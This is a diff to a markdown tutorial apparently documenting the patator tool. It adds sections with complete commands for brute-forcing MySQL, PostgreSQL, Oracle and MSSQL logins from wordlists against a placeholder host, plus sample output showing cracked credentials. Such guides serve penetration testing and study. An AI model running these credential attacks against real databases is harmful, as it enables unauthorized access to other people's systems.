@@ -199,6 +199,77 @@ test//18_200-2965:-1-0.035.txt
 Your good credentials are in test number: 
 test//18
 ```
+### MySQL
+In order to perform MySQL credentials bruteforce we are going to
+use the mysql_login module.
+```sh
+./patator.py mysql_login host=IPADDRESS user=FILE0 password=FILE1 0=user.txt 1=pass.txt -x ignore:fgrep="Access denied"
+```
+Output:
+```                                                                           
+09:53:28 patator    INFO - code  size    time | candidate                          |   num | mesg
+09:53:28 patator    INFO - -----------------------------------------------------------------------------
+09:53:28 patator    INFO - 0     6      0.003 | root:toor                          |    10 | 5.7.17
+09:53:28 patator    INFO - Hits/Done/Skip/Fail/Size: 1/90/0/0/90, Avg: 149 r/s, Time: 0h 0m 0s
+```
+Module options:
+```
+  host          : target host
+  port          : target port [3306]
+  user          : usernames to test
+  password      : passwords to test
+  timeout       : seconds to wait for a response [10]
+```
+### PostgreSQL
+In order to perform PostgreSQL credentials bruteforce we are going to
+use the `pgsql_login` module.
+```sh
+./patator.py  pgsql_login host=IPADDRESS user=FILE0 password=FILE1 0=user.txt  1=pass.txt -x ignore:egrep='exist|failed'
+```
+In this case we avoid not existing users and failed authentications.
+Output:
+```
+10:59:18 patator    INFO - code  size    time | candidate                          |   num | mesg
+10:59:18 patator    INFO - -----------------------------------------------------------------------------
+10:59:23 patator    INFO - 0     2      0.470 | testuser:postgres                  |   110 | OK
+10:59:23 patator    INFO - Hits/Done/Skip/Fail/Size: 1/110/0/0/110, Avg: 24 r/s, Time: 0h 0m 4s
+```
+Module options:
+```
+  host          : target host
+  port          : target port [5432]
+  user          : usernames to test
+  password      : passwords to test
+  database      : databases to test [postgres]
+  timeout       : seconds to wait for a response [10]
+```
+### Oracle (work in progress)
+In order to perform Oracle database credentials bruteforce we are going to
+use the `oracle_login` module.
+```sh
+./patator.py oracle_login host=IPADDRESS user=FILE0 password=FILE1 0=user.txt 1=pass.txt -x ignore:code=ORA-01017
+```
+Module options:
+```
+  host          : hostnames or subnets to target
+  port          : ports to target [1521]
+  user          : usernames to test
+  password      : passwords to test
+  sid           : sid to test
+  service_name  : service name to test
+```
+### MSSQL (work in progress)
+In order to perform Microsoft database bruteforce we are going to
+use the `mssql_login` module.
+Install dependencies and let's go.
+* pyopenssl 17.5.0 (https://pyopenssl.org/)
+* impacket 0.9.12 (https://github.com/CoreSecurity/impacket)
+```sh
+pip install pyopenssl
+pip install impacket
+./patator.py mssql_login host=IPADDRESS user=FILE0 password=FILE1 0=user.txt 1=pass.txt -x ignore:fgrep='Login failed for user'
+```
+### VNC
 
 
 ### SMTP (work in progress)
@@ -212,13 +283,7 @@ test//18
 ### SMB SID-lookup
 ### rlogin
 ### VMWare Authentication Daemon
-### MySQL
-### MySQL queries
-### Oracle
-### MSSQL
 ### RDP
-### PostgreSQL
-### VNC
 ### DNS
 ### DNS (reverse lookup subnets)
 ### SNMPv1/2 and SNMPv3
